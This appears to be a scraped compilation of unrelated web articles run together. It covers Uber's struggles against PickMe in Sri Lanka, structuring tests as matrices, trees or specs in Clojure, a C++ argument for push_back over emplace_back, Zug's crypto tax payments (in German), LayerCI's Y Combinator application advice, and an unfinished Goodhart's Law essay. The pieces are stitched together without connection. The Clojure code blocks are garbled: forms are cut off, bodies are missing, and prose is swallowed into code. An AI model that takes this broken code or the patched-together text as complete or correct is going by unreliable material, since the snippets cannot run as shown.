<p>Local Overrides allow you to experiment with site speed fixes on your local machine, so you have a really fast feedback loop. It's useful for helping you debug, spot issues, and test whether things like deferring JavaScript will break the page layout.</p>
<p>But for me, the biggest benefit is that it lets you be a lot more confident with the recommendations that you give.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Uber is one of the leaders in ride-sharing in the US and in Europe. However, they are having troubles in expanding to Asian continent. For example Ubers expansion to China failed, and Uber in China was acquired by DiDi. </p>
<p>In Sri Lanka the monopoly in ride-sharing is held by PickMe, with Uber at the second place. PickMe started as a small startup in Sri Lanka. They saw what Uber is doing in the USA and basically cloned the idea in Sri Lanka, and instead of taxis they used TukTuks, a popular three-wheel vehicles found in Asia that are similar to a Taxi in New York.</p>
<p>When Uber announced that they are starting operations in Sri Lanka, I thought they are going to give a good run for PickMe’s money, because Uber has deep wallets than PickMe, Uber has better technology than PickMe. And with cash in hand, Uber might be able to give competitive rates, and attract more users than PickMe.</p>
<p>However, years have passed and Uber is still at the second place, while PickMe has expanded and they are way ahead of Uber in Sri Lanka. It’s not the lack of cash or technology that defeated Uber in Sri Lanka, which they have plenty more than PickMe. </p>
<p>So what made Uber less successful in Sri Lanka than PickMe?</p>
<h2>Uber didn’t have an office in Sri Lanka, customers weren’t happy</h2>
<p>Even though initially there was an Uber office in Sri Lanka, slowly it was replaced by an office in India, which handled operations in Sri Lanka. </p>
<p>This led to scores of unhappy customers because, </p>
<ul><li>There was no hotline that handled complaints on behalf of users. The local number of the Uber office never worked, because almost all operations were done by an office in India.</li><li>Customers could not get any refunds when they were charged incorrectly.</li><li>Even when a user complained via the app, there was very little response, because for the office in India, they never cared about giving a good customer service for Sri Lanka.</li></ul>
<p>These unsatisfied customers meant more rides for PickMe. Yes, PickMe riders are the same set of riders who are Uber riders, but at least PickMe has a working customer hotline, and are very responsive in their app. I have received multiple refunds though Pickme when I was overcharged, but Uber zero refunds.</p>
<h2>Uber didn’t process payments well, and drivers weren’t happy</h2>
<p>Uber had this policy where they transferred money received by users who paid by credit cards to their drivers at the end of each month. </p>
<p>This made the drivers very unhappy, because most of these TukTuk drivers made a daily wage from their rides, and they didn’t want to do rides where they received money at the end of the month.</p>
<p>I’m one of those users who pay to ride-sharing with my credit card, I was asked numerous times for where riders asked me to either pay by cash, or they will call upfront and if I’m paying via my credit card they will cancel the ride.</p>
<p>However, PickMe’s payments were instant, when someone paid by card, the driver will get the money to their account within several hours, not at the end of the month.</p>
<p>There were other reasons that made both drivers and customers both unhappy, but these were the to main reasons that I can remember which made people pick PickMe over Uber.</p>
<p>Uber was making both drivers and users both unhappy at the same time, a very bad combination to have. </p>
<p>Soon more and more people started using PickMe more, and drivers also given up Uber towards PickMe. </p>
<p>Now Uber is playing a catchup game with PickMe to win back their lost rides, but at times it feels as if Uber has given up on winning the ride-sharing battle and focusing on something different. </p>

<h2>Uber is now king in food delivery in Sri Lanka</h2>
<p>For some reason Uber is doing quite well in food delivering in Sri Lanka. Here PickMe was late to the party, and Uber started their food devilry before PickMe. </p>
<p>The Uber eats app is more polished than PickMe. And even though I haven’t tried both food delivery apps, so I don’t know the real reason why Uber is ahead of food delivery in Sri Lanka but not in ride-sharing.</p>
<p>Anyway, the take away message is, even if you have deep pockets, and technology, you still can lose to a startup with far less cash, and technology if you are providing a poor service.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
            <p>Many tests for an operation iterate over a mapping of different inputs to expected outcomes. By looking at the tests for a single operation as the same test with different inputs and output expectations, we can start to question how we should model those tests.</p>
<h2 id="tests-as-matrices">Tests as Matrices</h2>
<p>By simply enumerating every possible combination of input values, we can construct a matrix with as many dimensions as inputs. We can then define the expected result for each set of inputs, and write a generalised test function:</p>
<blockquote>
<p>∀ input∈{(a, b, …, n) | a∈A, b∈B, …, n∈N} f(input)</p>
</blockquote>
<p>The number of possible test cases is thus:</p>
<blockquote>
<p>|<em>i</em><em>n</em><em>p</em><em>u</em><em>t</em><em>s</em>| = |A × B × ⋯ × N|</p>
</blockquote>
<p>As soon as our operation accepts an input that has more than a few possible values, that is any kind of number,<span><label for="sn-1"></label><span>With more than 8 bits at least. One could reasonably enumerate 256 different inputs for an operation, for correctness proven by test.</span></span> string, or complex data structure, enumerating every possible input combination becomes impractical. Instead we can resort to groupings of values via properties.</p>
<p>This is a test matrix for division which uses properties instead of values, with the rows being dividends, and the columns divisors:</p>
<table>
<thead>
<tr>
<th>÷</th>
<th>Positive</th>
<th>Zero</th>
<th>Negative</th>
</tr>
</thead>
<tbody>
<tr>
<td>Positive</td>
<td>Positive</td>
<td>undefined</td>
<td>Negative</td>
</tr>
<tr>
<td>Zero</td>
<td>Zero</td>
<td>undefined</td>
<td>Zero</td>
</tr>
<tr>
<td>Negative</td>
<td>Negative</td>
<td>undefined</td>
<td>Positive</td>
</tr>
</tbody>
</table>
<p>Matrices like this are necessarily exhaustive,<span><label for="sn-2"></label><span>Unless we designate a special result to mean “<em>do not test this set of inputs</em>”.</span></span> and force us to think about the result for every possible combination of the input values we have included.</p>
<p>This is an implementation of the same property matrix in Clojure:</p>
<div><pre><code>(<span>ns</span> division-matrix-test

    `(<span>doseq</span> [combination# [<span>~@combinations]]</span>
       (<span>apply</span> <span>~test-fn</span> combination#))))

(<span>deftest</span><span> safe-division-test</span>

          (<span>case</span> kind

            <span>:neg</span> (gen/generate (s/gen neg-int?))
            <span>:zero</span> <span>0</span>))]

    (test-matrix

     (<span>fn</span> [x y result-pred]
       (<span>let</span> [dividend (gen-input x)
             divisor (gen-input y)]
         (<span>is</span> (result-pred (safe-divide dividend divisor))
             (<span>format</span> <span>"Failed with: %s / %s"</span> dividend divisor))))

     [[nil    <span>:pos</span>   <span>:zero</span>  <span>:neg</span> ]

      [<span>:neg</span>   <span>neg?</span>   <span>nil?</span>   <span>pos?</span> ]])))</code></pre></div>
<p>In this case we are testing a safe variant of the division function <code>/</code>, which returns <code>nil</code> if the divisor is zero. This simplifies the testing process, because we do not have to include any exception catching logic in our test function, or invent a notation to mean <em>this set of inputs should result in a thrown exception</em>.</p>
<p>It is worth noting that such a direct interpretation of a matrix is only possible in a language as malleable as Clojure. In other languages, we might have to resort to enumerating a set of <code>(dividend
divisor result)</code> tuples, losing the guarantee of covering all possible combinations.</p>
<p>But even in Clojure, more than two dimensions in this matrix will quickly become unwieldy and hard to follow, and a tuple-based approach would scale better to larger numbers of input parameters.</p>
<h2 id="tests-as-trees">Tests as Trees</h2>
<p>Another way we could structure our tests is as a tree. A tree does not have to be exhaustive the same way a matrix has to be.<span><label for="sn-3"></label><span>Again, assuming we are using a matrix based approach, rather than enumerating combinations manually.</span></span> We can omit certain combinations of inputs by pruning their branches. In this way we are implying that if a single input has a given value, it defines the result regardless of the other inputs’ values.</p>
<p>In the division example all branches with a divisor of zero could be collapsed into a single case, as the dividend does not matter in this case. This only works if the first level of branching describes the divisor, and the dividends are on the second level.</p>
<div><pre><code>(<span>ns</span> division-tree-test

          (<span>is</span> (<span>pos?</span> (safe-divide dividend divisor))))))))</code></pre></div>
<p>This might look more verbose, but in exchange we get a unique label for every tree branch,<span><label for="sn-4"></label><span>We can also make use of useful property of <code>clojure.test</code>: if a test fails, it will traverse the <code>testing</code> statements upwards and concatenate the names, providing us with the path of the failed test. For example “<em>with a negative divisor and a zero dividend</em>”.</span></span> which can improve readability. The nesting also naturally lends itself to lexical scoping, so we only have the values in scope which apply on a given branch.</p>
<p>A key advantage of the tree structure is flexibility. If one of the branches requires special code, we can confine it to that branch, avoiding complicating the remaining branches more than necessary.</p>
<p>Trees also scale better with larger numbers of inputs or options for inputs. A tree might grow overly wide or deep, but we can split it if that becomes a problem.</p>
<p>There is a downside to omitting branches though. If we change our <code>safe-divide</code> function to return different results depending on the dividend when the divisor is zero, our tests might still pass, depending on the specific inputs used, but we will lose test coverage for certain code paths. We have chosen to not test certain input combinations, and we need to be aware of this omission when we are changing the code under test.</p>
<h2 id="tests-as-definitions">Tests as Definitions</h2>
<p>Considering the formula describing the generalised test function above, we could also consider translating this directly into code. This can work, but only if we can test results without re-implementing large parts of the code under test, otherwise we are overly coupling the tests to the code. In the division case, we can decide the sign of the result<span><label for="sn-5"></label><span>Or the existence, for that matter.</span></span> based on the signs of the inputs.</p>
<div><pre><code>(<span>ns</span> division-spec-test

<p>This solution is specific to Clojure, though many other languages have property based testing tools that work similarly.</p>
<p>By adding a spec to our function, we can run a large number of different inputs against our function, and assert a property about the result based on the inputs. It will even shrink the inputs to find the simplest set of inputs to trigger a spec failure.</p>
<p>This means we do not have a programmer writing a matrix or a tree by hand anymore, which has some advantages. The main one being that a programmer might not consider all possible inputs.</p>
<div><pre><code>Fail in safe-divide-spec-test
Failed with: {<span>:args</span> {<span>:dividend</span> ##NaN, <span>:divisor</span> <span>0</span>}, <span>:ret</span> ##NaN}

<h2 id="conclusion">Conclusion</h2>
<p>The optimal shape of a test depends mainly on the structure of the inputs to the operation we are testing, as well as its nature.</p>
<p>For pure functions which we expect to use widely and change rarely, property-based testing can be desirable to avoid unintended consequences. There is also a certain speed requirement for test shrinking to work effectively.</p>
<p>Operations with a small number of possible inputs can also be tested via test matrices, which have fewer limitations, but do not guarantee …</p></section></div>

    <p>In one of my recent training courses, a student informed me that both clang-tidy
and PVS-Studio were complaining about some code of the form</p>

<div><div><pre><code>std::vector&lt;Widget&gt; widgets;
~~~
widgets.push_back(Widget(foo, bar, baz));
</code></pre></div></div>

<p>Both tools flagged this line as “bad style.”
clang-tidy even offered a (SARCASM ALERT) helpful fixit:</p>

<div><div><pre><code>warning: use emplace_back instead of push_back [modernize-use-emplace]
    widgets.push_back(Widget(foo, bar, baz));
            ^~~~~~~~~~~~~~~~~             ~
            emplace_back(
</code></pre></div></div>

<p>The student dutifully changed the line, and both tools reported their
satisfaction with the replacement:</p>

<div><div><pre><code>widgets.emplace_back(Widget(foo, bar, baz));
</code></pre></div></div>

<p>The original line materializes a temporary <code>Widget</code> object on the stack;
takes an rvalue reference to it; and passes that reference to
<code>vector&lt;Widget&gt;::push_back(Widget&amp;&amp;)</code>, which move-constructs a <code>Widget</code>
into the vector. Then we destroy the temporary.</p>

<p>The student’s replacement materializes a temporary <code>Widget</code> object on the stack;
takes an rvalue reference to it; and passes that reference to
<code>vector&lt;Widget&gt;::emplace_back&lt;Widget&gt;(Widget&amp;&amp;)</code>, which move-constructs
a <code>Widget</code> into the vector. Then we destroy the temporary.</p>

<p><em>Absolutely no difference.</em></p>

<p>The change clang-tidy meant to suggest — and in fact <em>did</em> suggest,
if you pay very close attention to the underlining in the fixit — was actually this:</p>

<div><div><pre><code>widgets.emplace_back(foo, bar, baz);
</code></pre></div></div>

<p>This version does <em>not</em> materialize any <code>Widget</code> temporaries. It simply
passes <code>foo, bar, baz</code> to <code>vector&lt;Widget&gt;::emplace_back&lt;Foo&amp;, Bar&amp;, Baz&amp;&gt;(Foo&amp;, Bar&amp;, Baz&amp;)</code>,
which constructs a <code>Widget</code> into the vector using whatever
constructor of <code>Widget</code> best matches that bunch of arguments.</p>

<h2 id="emplace_back-is-not-magic-c11-pixie-dust"><code>emplace_back</code> is not magic C++11 pixie dust</h2>

<p>Even a decade after C++11 was released, I still sometimes see programmers assume
that <code>emplace_back</code> is somehow related to move semantics. (In the same way that
some programmers assume lambdas are somehow the same thing as <code>std::function</code>,
you know?) For example, they’ll rightly observe that this code makes an
unnecessary copy:</p>

<div><div><pre><code>void example() {
    auto w = Widget(1,2,3);
    widgets.push_back(w);  // Copy-constructor alert!
}
</code></pre></div></div>

<p>So they’ll change it to this:</p>

<div><div><pre><code>void example() {
    auto w = Widget(1,2,3);
    widgets.emplace_back(w);  // Fixed? Nope!
}
</code></pre></div></div>

<p>The original line constructs a <code>Widget</code> object into <code>w</code>, then
passes <code>w</code> by reference to <code>vector&lt;Widget&gt;::push_back(const Widget&amp;)</code>,
which copy-constructs a <code>Widget</code> into the vector.</p>

<p>The replacement constructs a <code>Widget</code> object into <code>w</code>, then
passes <code>w</code> by reference to <code>vector&lt;Widget&gt;::emplace_back&lt;Widget&amp;&gt;(Widget&amp;)</code>,
which copy-constructs a <code>Widget</code> into the vector.</p>

<p><em>Absolutely no difference.</em></p>

<p>What the student should have done is ask the compiler to make an
<em>rvalue</em> reference to <code>w</code>, by saying either</p>

<div><div><pre><code>widgets.push_back(std::move(w));
</code></pre></div></div>

<p>or</p>

<div><div><pre><code>widgets.emplace_back(std::move(w));
</code></pre></div></div>

<p>It doesn’t matter which verb you use; what matters is the value category of
<code>w</code>. You must explicitly mention <code>std::move</code>, so that the language (and the
human reader) understand that you’re done using <code>w</code> and it’s okay for
<code>widgets</code> to pilfer its guts.</p>

<p><code>emplace_back</code> was added to the language at the same time as <code>std::move</code> — just
like lambdas were added at the same time as <code>std::function</code> — but that doesn’t
make them the same thing. <code>emplace_back</code> may “look more C++11-ish,” but it’s
not magic move-enabling pixie dust and it will never insert a move in a place
you don’t explicitly request one.</p>

<h2 id="when-all-else-is-equal-prefer-push_back-to-emplace_back">When all else is equal, prefer <code>push_back</code> to <code>emplace_back</code></h2>

<p>So, given that these two lines do the same thing and are equally efficient
at runtime, which should I prefer, stylistically?</p>

<div><div><pre><code>widgets.push_back(std::move(w));
widgets.emplace_back(std::move(w));
</code></pre></div></div>

<p>I recommend sticking with <code>push_back</code> for day-to-day use. You should definitely
use <code>emplace_back</code> when you need its particular set of skills — for example, <code>emplace_back</code>
is your only option when dealing with a <code>deque&lt;mutex&gt;</code> or other non-movable type —
but <code>push_back</code> is the appropriate default.</p>

<p>One reason is that <code>emplace_back</code> is more work for the compiler.
<code>push_back</code> is an overload set of two non-template member functions.
<code>emplace_back</code> is a single variadic template.</p>

<div><div><pre><code>void push_back(const Widget&amp;);
void push_back(Widget&amp;&amp;);

template&lt;class... Ts&gt;
reference emplace_back(Ts&amp;&amp;...);
</code></pre></div></div>

<p>When you call <code>push_back</code>, the compiler must do overload resolution, but that’s all.
When you call <code>emplace_back</code>, the compiler must do template type deduction, followed
by (easy-peasy) overload resolution, followed by function template instantiation and
code generation. That’s a much larger amount of work for the compiler.</p>

<h2 id="the-benchmark-program">The benchmark program</h2>

<p>I wrote a simple test program to demonstrate the difference in compiler workload.
Of course <a href="https://en.wikipedia.org/wiki/Amdahl%27s_law">Amdahl’s Law</a> applies:
my benchmark displays a massive difference because it’s doing <em>nothing but</em>
instantiating <code>emplace_back</code>, whereas any production codebase will be doing vastly
more other stuff relative to the number of times it instantiates <code>emplace_back</code>.
Still, I hope this benchmark gives you a sense of why I recommend “<code>push_back</code> over
<code>emplace_back</code>” and not vice versa.</p>

<p>This Python 3 script generates the benchmark:</p>

<div><div><pre><code>import sys
print('#include &lt;vector&gt;')
print('#include &lt;string&gt;')
print('extern std::vector&lt;std::string&gt; v;')
for i in range(1000):
    print('void test%d() {' % i)
    print('    v.%s_back("%s");' % (sys.argv[1], 'A' * i))
    print('}')
</code></pre></div></div>

<p>Generate like this:</p>

<div><div><pre><code>python generate.py push &gt;push.cpp
python generate.py emplace &gt;emplace.cpp
time g++ -c push.cpp
time g++ -c emplace.cpp
</code></pre></div></div>

<p>With Clang trunk on my laptop, I get consistently about 1.0s for the <code>push</code> version,
and 4.2s for the <code>emplace</code> version. This big difference is due to the fact that the
<code>push</code> version is merely code-generating a thousand <code>test</code> functions, whereas
the <code>emplace</code> version is code-generating that same thousand <code>test</code> functions <em>and</em>
another thousand template instantiations of <code>emplace_back</code> with different parameter
types:</p>

<div><div><pre><code>vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[1]&gt;(const char (&amp;)[1])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[2]&gt;(const char (&amp;)[2])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[3]&gt;(const char (&amp;)[3])
vector&lt;string&gt;::emplace_back&lt;const char(&amp;)[4]&gt;(const char (&amp;)[4])
~~~
</code></pre></div></div>

<p>See, <code>push_back</code> knows that it expects a <code>string&amp;&amp;</code>, and so it knows to call the
non-explicit constructor <code>string(const char *)</code> on the caller’s side. The same
constructor is called in each case, and the temporary <code>string</code> is passed to
the same overload of <code>push_back</code> in each case. <code>emplace_back</code>, on the other hand,
is a dumb perfect-forwarding template: it doesn’t know that the relevant constructor
overload will end up being <code>string(const char *)</code> in each case. So it takes
an lvalue reference to the specific <em>array type</em> being passed by the caller.
Perfect-forwarding has no special cases for <code>const char *</code>!</p>

<p>If we change <code>vector&lt;string&gt;</code> to <code>vector&lt;const char *&gt;</code>, the compile-time-performance
gap widens: now it’s 0.7s for <code>push</code>, 3.8s for <code>emplace</code>. This is because we’ve cut
out some of the work that was common to both versions (constructing <code>std::string</code> objects)
without affecting the source of the gap (that one version instantiates a
thousand copies of <code>emplace_back</code> and the other doesn’t). Amdahl’s Law in action!</p>

<p>My conclusions:</p>

<blockquote>
  <p>Use <code>push_back</code> by default.</p>
</blockquote>

<blockquote>
  <p>Use <code>emplace_back</code> where it is semantically significant to your algorithm
(such as when the element type’s move-constructor is absent or has been
benchmarked as expensive).</p>
</blockquote>

<blockquote>
  <p>Avoid mixing string literals and perfect-forwarding templates,
especially in repetitive machine-generated code.</p>
</blockquote>

      <p><strong>Ab 2021 können im Kanton Zug Steuerschulden mit Kryptowährungen beglichen werden. Akzeptiert werden die Währungen Bitcoin und Ether. Möglich wird dies dank einer Zusammenarbeit mit Bitcoin Suisse, einer Pionierin im Schweizer Crypto Valley. Zug ist damit der erste Schweizer Kanton, in dem Steuern mit Kryptowährungen bezahlt werden können.</strong></p>
<p>Der Kanton Zug wird seiner Rolle als Vorreiter in den neuen Blockchain-Technologien erneut gerecht und bietet als erster Schweizer Kanton die Möglichkeit an, Steuerschulden mit Kryptowährungen zu bezahlen. Die kantonale Steuerverwaltung akzeptiert dieses neue Zahlungsmittel ab Februar 2021.</p>
<p><strong>Kanton Zug fördert Kryptowährungen<br></strong>Der Kanton Zug beheimatet eine überdurchschnittlich grosse Anzahl Unternehmen aus der Krypto-Branche. «Als Heimat des Crypto Valleys ist es uns wichtig, den Einsatz von Kryptowährungen im Alltag weiter zu fördern und zu vereinfachen», sagt Finanzdirektor Heinz Tännler und fügt an: «Durch die Möglichkeit, Steuerschulden mit Bitcoin oder Ether bezahlen zu können, machen wir einen grossen Schritt in diese Richtung.» Die Steuerbegleichung mittels Kryptowährung wird sowohl Gesellschaften als auch Privatpersonen bis zu einem Forderungsbetrag von 100'000 Franken zur Verfügung stehen. Teilzahlungen werden nicht akzeptiert. In den kommenden Wochen findet ein Pilot statt, um die Prozesse zu testen, damit bis zum nächsten Steuerrechnungslauf im Februar 2021 alles bereit ist.</p>
<p><strong>QR-Code bei Steuerverwaltung beantragen<br></strong>Ermöglicht wird die Steuerbegleichung mit Kryptowährungen durch die Crypto-Payments-Lösung des im Kanton Zug ansässigen Unternehmens Bitcoin Suisse. Wollen Steuerzahlende ihre Rechnung in Kryptowährung bezahlen, können sie dies der Steuerverwaltung mitteilen. Sie erhalten danach den dafür notwendigen QR-Code (i.d.R. per E-Mail) zugestellt. Finanzdirektor Heinz Tännler stellt klar: «Wir gehen mit der neuen Zahlungsmethode kein Risiko ein, da wir den Betrag auch bei einer Bezahlung in Bitcoin oder Ether immer in Schweizer Franken erhalten.» Somit haben auch grössere Schwankungen im Krypto-Wechselkurs keinen Einfluss auf die geleistete Zahlung in Schweizer Franken.</p>
<p><strong>Zusammenarbeit mit Bitcoin Suisse<br></strong>Die Zuger Finanzdirektion hat sich für eine Zusammenarbeit mit dem 2013 gegründeten Unternehmen Bitcoin Suisse entschieden. Bitcoin Suisse bringt in die Partnerschaft mit dem Kanton Zug mehr als sieben Jahre Erfahrung in der Kryptotechnologie und im Zahlungsverkehr ein. Dr. Arthur Vayloyan, CEO von Bitcoin Suisse sagt: «Die Kombination von Handelstechnologie und Zahlungsverkehr mit Kryptowährungen ermöglicht uns, dem Steuerzahler eine gute Benutzererfahrung zu bieten und dem Kanton Zug einen ausgereiften Service zu offerieren.» Bitcoin Suisse hat das Krypto- und Blockchain-Ökosystem in der Schweiz massgeblich geprägt und war eine treibende Kraft bei der Entwicklung des «Crypto Valleys» und der «Crypto Nation Switzerland». Als regulierter Schweizer Finanzintermediär in der Lizenzierungsphase für die Schweizer und Liechtensteinische Banklizenz, bietet Bitcoin Suisse Prime Brokerage, Verwahrung, Crypto Payments, besicherte Darlehen, Staking, Tokenization und andere Krypto-Finanzdienstleistungen für private und institutionelle Kunden an.</p>

<section>
<div>
<p><strong>In this post you will find:</strong></p><ul><li>How LayerCI got into Y Combinator</li><li>How to write your YC application</li><li>How to prepare for your YC interview</li><li>Is it worth it?</li></ul><p>After getting into Y Combinator ourselves and reviewing over 100 YC applications last year (3 successfully applied to W21), we decided to share our experience applying, interviewing, and going through the<a href="https://layerci.com/blog/layerci-ycombinator/"> first-ever remote YC batch in summer 2020.</a></p><p><em>Disclaimer: by no means are we YC partners or speaking on behalf of the organization - this is just from our personal experience as founders who went through the program.</em></p><p><strong>How LayerCI got into Y Combinator:</strong></p><p>LayerCI got into YC after applying twice - once in 2019 and once in 2020. We applied with the same idea each time. Here is a high level overview of the differences between 2019 and 2020.</p><p>2019:</p><ol><li>Presence: The website was up but no demo video.</li><li>Team: One full-time founder.</li><li>Product: Product in alpha but launched.</li><li>Launches: none.</li><li>Preparation for YC: <a href="http://www.paulgraham.com/">Paul Graham essays</a></li><li>Result: No interview request but received a phone call to ask more questions.</li></ol><p>2020:</p><ol><li>Presence: The website was up and a demo video was present.</li><li>Team: Two full-time founders, 50:50 ownership split. We went from <a href="https://www.youtube.com/watch?v=PAFq0UjhwM4">lone dancing guy</a> to a founding team (see video for reference).</li><li>Product: Product iterated after speaking to 1000 people. Acquired some paying customers.</li><li>Launches: <a href="https://news.ycombinator.com/item?id=23035094">Show HN</a>, Betalist, Linkedin.</li><li>Preparation for YC: We read <a href="https://www.amazon.ca/dp/B007X5ZBU4/ref=dp-kindle-redirect?_encoding=UTF8&amp;btkr=1">The Launchpad</a>, <a href="http://www.paulgraham.com/">Paul Graham essays</a>, <a href="https://mittalrohit.com/59-links-for-y-combinator-application-and-interview-advice-bf90191be8ed">public YC apps</a>, mock interviewed with 10 YC founders, friends, and a former YC partner.</li><li>Result: invited to interview, accepted into Y Combinator.</li><li>A key point as well to note in 2020: we had started to speak to investors, and got the opportunity to get about the same amount of funding as what YC was providing. Although we did not mention this in our application, we were protecting our startup in every way possible.</li></ol><p>Looking back, the level of commitment to our business in the second application was a lot more apparent with both progress and preparation. We embodied the "success = preparation meets opportunity" mentality.</p><p><strong>How to write your YC application:</strong></p><p>From our experience, the YC application should look like a business plan with no buzzwords. When re-applying, we first took a look at our 2019 application to look for good answers and bad ones. We studied a couple of public YC applications and discussed why they might have been successful. One of the best-crowdsourced resources to help construct your application is this <a href="https://standuply.com/blog/yc-application-advice/">blog post here</a>.</p><p>Some of the most important questions that you need to answer are:</p><ul><li>Product: What are you building?</li><li>Traction: How do we know people want it?</li><li>Founders: Why is your team special?</li><li>Why now: What's your unique insight? Why build this thing now?</li><li>Market sizing: Based on your current business model, is there a clear path to $1M? What about $100M?</li><li>Red flags: Any immediate IP or founder dynamic issues? Is the cap table "clean"? Is there some key trend in the market that makes this a bad business idea?</li></ul><p>We discovered some common mistakes to avoid while reviewing other YC applications:</p><ul><li>Product: Too many buzzwords are used to describe the product.</li><li>Traction: Not launching early, no market research and no website present.</li><li>Founders: No clear division of roles and very lopsided equity splits.</li><li>Why now: Not clearly teaching the partners something new about your market. You should be an expert on what you're building, who you're building for, and trigger events in the market that make today the best time to build.</li><li>Market sizing: The market is too small (less than $1B Total Addressable Market), or the market is explained badly. It should be a bottoms-up calculation based on your product's business model. A good bottoms-up calculation template: "At our current price point of $X annually, we would need X amount of customers to get to $1M. We would only need X customers or only need X% of the market to build a billion-dollar business."</li><li>Red flags: Explained above.<br></li></ul><p>Sounds a bit like an investment pitch, doesn't it? That's because it is.</p><p><br><strong>How to prepare for your YC interview:</strong></p><p>When we found out we were invited for an interview, we had a little under a week to prepare. We wanted to appear confident with good founder dynamics and a clear understanding of our business. Unless you're a natural-born speaker, it's probably a good idea to practice to keep your answers sharp. Nobody is expecting perfect answers, but you should be articulate enough to sell your vision in 10 minutes.</p><p>Here are the steps we took to prepare for our interview:</p><ul><li>We first looked for sample questions that might be asked: <a href="https://lironshapira.medium.com/sample-questions-for-the-y-combinator-interview-3895913ffe89">https://lironshapira.medium.com/sample-questions-for-the-y-combinator-interview-3895913ffe89</a></li><li>We took the questions and made a Google Sheet with three tabs. Tab 1 was the list of potential YC questions divided up amongst the two founders with dot jot answers for each question. Tab 2 contained a feedback chart for the tips we received from mock interviews and what questions we can improve on. Tab 3 contained <a href="https://www.ycombinator.com/people/">all the YC partners </a>and whether or not they were technical (as a developer-focused company we wanted to make sure we communicated well to non-technical partners too).</li><li>We tapped into our network to ask non-YC and YC friends for 10-minute mock interviews. We ended up scheduling 10 mock interviews and dramatically improving our pitch by the end.</li><li>"What are you building?" was the hardest question we had to answer. We discussed this often and made a decision tree of what we might be asked next. We wanted to avoid the follow up question to be: "well, how are you different from X?" </li><li>To prepare for the "what are you building?" question, we iterated our landing page and we created a Show HN post here a couple of days before our interview. We stayed up to see why people would convert or leave. This ultimately became our opening pitch to the YC partners.</li><li>On the day of the interview, we dressed up in our matching LayerCI shirts to show team spirit and double-checked our computer setup before going live.</li><li>During the interview, we sat next to each other and had an agreed upon protocol to make sure we did not step on each other's toes when it came to questions. We purchased a tiny microphone that we would slowly pass to the other person if we felt like they were the better person to answer. </li></ul><p>Some insights from our remote interview experience:</p><ul><li>Don't forget to smile! It's a cool experience to meet YC partners and to have people be excited about your idea. Smiling even if you're nervous makes you look extra confident. </li><li>It's a 10-minute interview on Zoom video with about 3-6 YC staff members on the call.</li><li>You should test out your camera and microphone in advance of the interview.</li><li>You should go into "gallery view" on Zoom the minute you enter the Zoom room.</li><li>The first question asked by the YC partners is always "What are you building?"</li><li>You should give concise, yet "meaty" answers. If a partner wants to hear more about something, they'll ask. </li><li>You may be asked to be interviewed again in the same day or a couple days after if YC is looking for more information.</li><li>You'll get a call if you get accepted and an email if you get rejected.</li></ul><p><strong>Is it worth it?</strong></p><p>There are two parts to answering the "is it worth it" question.</p><p>"Is it worth it to apply to Y Combinator?"</p><p>When it comes to the application process, to do a good job you do have to invest a couple of hours of you and your co-founding team's time. It <em>will </em>and<em> should</em> bring up tough conversations when it comes to commitment, equity, or the business idea itself. All of these hard things are important to bring up anyway, so think of applying as a productive way to reflect on your startup while getting the chance to join a prestigious network. Chances are, if you find holes in your business or founder dynamic, it will reveal itself earlier rather than later which is beneficial for you in the long run. The answer is always yes to this question - shoot your shot!</p><p>"Is it worth it to go through Y Combinator?"</p><p>This is a tougher question to answer.</p><p><br>Let's look at the basis of the investment you receive. YC says, "we'll invest $125k on a post-money safe in return for 7% of the company when the safe converts".</p><ul><li>Pro - the post-money SAFE terms (<a href="https://www.ycombinator.com/deal/">found here</a>) are very founder-friendly compared to most other investment vehicles at an early stage.</li><li>Con - 7% is a lot of ownership for YC, not to mention the 4% exercise rights for future financing rounds even after the SAFE is converted into equity.</li></ul><p>The network effects of joining YC are pretty strong for these cases even as the program switched to remote delivery:</p><ul><li>Fundraising signalling - many people raise a seed round thanks to YC's original investment.</li><li>Early adopters - this is the best place to find early adopters in the <a href="https://ondigitalmarketing.com/learn/odm/foundations/5-customer-segments-technology-adoption/">5 stages of technology adoption</a> framework. Many people get their first 10-50 customers through YC to prove out early traction in a friendly environment.</li><li>Future proof - if you start another company you have a wider network than you did previously.</li><li>Emotional support - given the shared commonality of running startups, there's nowhere else in the world you can find as strong of a founder community.</li></ul><p>Here's where you have to think about the investment opportunity on your own given your unique stage of the company. Here are some helpful questions to answer before taking investment:</p><ul><li>Do you have significant early traction?</li><li>Would you be able to raise at a fair valuation without YC's signalling?</li><li>Are you an experienced founder?</li><li>Do you have a strong founder network already?</li><li>Do you have employees and/or investors who will be impacted by this decision?</li></ul><p>If the answer is "no" to all or some of these questions, joining Y Combinator may increase your startup's survival rate. If the answer is "yes" to most or all of the questions, it could go either way in terms of value-add. It is best to have an honest discussion with your team and evaluate your options in both cases.</p><p><strong>Where to apply: </strong>You can apply to the Summer 2021 batch here <a href="https://www.ycombinator.com/apply/">https://www.ycombinator.com/apply/</a></p><p>Good luck!</p><p>Colin + Lyn </p>

		<p>Peter Drucker said “if you can’t measure it you can’t improve it,” but he didn’t mention the second-order effects of that statement. What changes after people get used to the measurements? What if we measure things that are only partly relevant to what we’re trying to improve?</p>
<p>Tracking metrics can tell us something new, but can also create problems. Let’s look at how Goodhart’s Law leads to unintended consequences.</p>
<h2>A New Morality of Attainment</h2>
<p>Goodhart’s original quote, about monetary policy in the UK (of all things) was:</p>
<blockquote><p>“Any observed statistical regularity will tend to collapse once pressure is placed upon it for control purposes.”</p></blockquote>
<p>But Goodhart’s original is often reinterpreted so that we can talk about more than economics. Anthropologist Marilyn Strathern, in “<a href="https://archive.org/details/ImprovingRatingsAuditInTheBritishUniversitySystem/page/n1/mode/2up">Improving Ratings: Audit in the British University System</a>,” summarized Goodhart’s Law as:</p>
<blockquote><p>“When a measure becomes a target, it ceases to be a good measure.”</p></blockquote>
<p>This is the version of the law that most people use today.</p>
<p>Other commonly used variations include the Lucas Critique (from Robert Lucas’s work on macroeconomic policy):</p>
<blockquote><p>“Given that the structure of an econometric model consists of optimal decision rules of economic agents, and that optimal decision rules vary systematically with changes in the structure of series relevant to the decision maker, it follows that any change in policy will systematically alter the structure of econometric models.”</p></blockquote>
<p>And also Campbell’s Law:</p>
